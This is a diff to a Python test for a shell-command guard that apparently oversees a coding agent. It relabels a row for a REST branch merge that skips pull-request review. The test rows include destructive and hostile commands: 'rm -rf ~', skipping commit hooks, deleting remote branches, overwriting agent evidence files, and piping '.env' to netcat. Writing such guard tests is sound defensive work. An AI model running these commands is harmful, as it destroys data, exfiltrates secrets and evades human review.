@@ -11759,7 +11759,8 @@ class GuardQuotedOperatorTest(_GuardDebtCase):
         ("echo ~ | xargs rm -rf ';'", "deny", "deny", "BUDGET"),  # T-3937: xargs rm có đích chữ (`;`)
         ('python3 -c \'import subprocess; subprocess.run(["bash", "-c", "\\n" "rm -rf ~"])\'', "ask", "", "OTHER_ASK"),
         ("echo '>' ; git commit --no-verify -m x", "deny", "deny", "RULE_DENY"),
-        ("cat < '<' ; gh api repos/o/r/merges --input b.json", "ask", "deny", "REVIEW_FORGE"),
+        # T-3952: REST `merges` là merge nhánh không qua PR → dấu UNVERIFIED đứng trước REVIEW_FORGE (vẫn chặn)
+        ("cat < '<' ; gh api repos/o/r/merges --input b.json", "ask", "deny", "UNVERIFIED"),
         ("watch -n 1 gh api -X DELETE repos/o/r/git/refs/heads/x ';'", "deny", "deny", "REMOTE_DELETE"),
         ("watch -n 1 cp x .autopilot/state.json '&&' true", "ask", "deny", "EVIDENCE_HANDWRITE"),
         ("watch -n 1 nc h 80 '<' .env", "deny", "deny", "RULE_DENY"),
